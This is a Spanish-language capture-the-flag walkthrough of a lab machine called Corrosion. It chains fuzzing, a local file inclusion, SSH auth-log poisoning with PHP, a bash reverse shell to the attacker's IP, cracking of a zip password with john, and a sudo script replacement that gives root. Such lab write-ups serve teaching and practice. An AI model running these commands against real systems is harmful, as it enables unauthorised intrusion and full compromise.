PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

-En el puerto 80 hay un servidor Apache default

-Hacemos Fuzzing y encontramos los siguientes directorios:
	-/tasks                
	-/blog-post

-Contenido de /tasks:
	# Tasks that need to be completed
	1. Change permissions for auth log
	2. Change port 22 -> 7672
	3. Set up phpMyAdmin

-En /blog-post encontramos una web en desarrollo, hacemos Fuzzing sobre esta ruta:
	-Encontramos la ruta --> /blog-post/archives/randylogs.php

-Aplicamos Fuzzing de parámetros:
	-ffuf -u "http://192.168.1.136/blog-post/archives/randylogs.php?FUZZ=/etc/passwd" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -fs 0
		-file (Parametro encontrado!!)

-Hemos encontrado una vulnerabilidad LFI y somos capaces de ver el /etc/passwd

-Vamos a intentar envenenar los logs de SSH para derivar el LFI a un RCE

## SSH Log Poisoning

-Nos autenticamos por ssh inyectamendo código PHP:
	-ssh '<?php system("id");?>'@192.168.1.136
		-Aparece el error --> 'remote username contains invalid characters'

-El error sucede porque en **versiones recientes** de SSH **no se pueden poner estos caracteres** en el username de SSH. Vamos a **Desplegar un contenedor Docker** con una **versión de SSH más Antigua.**

-Desplegar versión SSH más antigua con Docker:
	1-docker pull ubuntu:18.04 (Actualmente van por la 24.04)
		-Comprobamos que la imagen está en nuestro equipo:
			-sudo docker images
				ubuntu       18.04     f9a80a55f492   23 months ago   63.2MB
	2-Creamos el contenedor a partir de la imagen:
		-sudo docker run -dit --name rce f9a80a55f492
	3-Entramos dentro del contenedor:
		-sudo docker exec -it rce bash
			root@3c92b45af74b:/# hostname -I
			172.17.0.2 (Estamos dentro del contenedor!!)
	4-Instalamos SSH dentro del contenedor:
		-Primero actualizamos los paquetes:
			-apt update
		-instalamos SSH:
			-apt-get install openssh-client

-Ahora que **tenemos** una **versión más antigua** de SSH , la cual nos permite inyectar código malicioso, **probamos** a **ejecutar un comando** mediante código PHP:
	-root@3c92b45af74b:/# ssh '<?php system('id');?>'@192.168.1.136
	<?php system(id);?>@192.168.1.136's password: loquesea 
	-Salimos (CONTROL + C)
	-Nos vamos a la URL a revisar los logs:
		-Connection closed by invalid user **uid=33(www-data) gid=33(www-data) groups=33(www-data)**
			-HEMOS COLADO UN COMANDO EN EL SERVIDOR!!

-Subimos una webshell al servidor:
	![[Pasted image 20250423140829.png]]

-Hemos subido la webshell y podemos ejecutar comando a través de la ruta de logs:
	-http://192.168.1.136/blog-post/archives/randylogs.php?file=/var/log/auth.log&cmd=id
		-Miramos los logs:
			-Connection closed by invalid user **uid=33(www-data) gid=33(www-data) groups=33(www-data)**

-Nos mandamos una RS y obtenemos acceso a la máquina:
	-http://192.168.1.136/blog-post/archives/randylogs.php?file=/var/log/auth.log&cmd=bash -c 'bash -i >%26 /dev/tcp/192.168.1.135/1234 0>%261'
		www-data@corrosion:/tmp$ whoami
		www-data

## Escalada de Privilegios

-Nos vamos a /var/backups y encontramos el siguiente archivo:
	-user_backup.zip (Nos pide contraseña)

-Nos lo trasladamos a nuestra máquina local con Netcat

-Generamos hash y lo rompemos:
	-zip2john user_backup.zip > hash.txt
	-john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
		!randybaby       (user_backup.zip)

-Pivotamos al usuario randy:
	-su randy
	-Password: !randybaby
		randy@corrosion:~/tools$

-Revisamos los permisos sudoers:
	-sudo -l
		(root) PASSWD: /home/randy/tools/easysysinfo

-No tenemos permisos de escritura (w), pero el script se encuentra en nuestro directorio de trabajo, por lo que podemos borrar el script actual y reemplazarlo por uno que creemos nosotros:
	-Borramos el script:
		-rm -rf easysysinfo
	-Creamos el nuestro para escala privilegios:
		-echo 'chmod u+s /bin/bash'
		chmod +x easysysinfo

sudo /home/randy/tools/easysysinfo
bash -p
	bash-5.1# whoami
	root
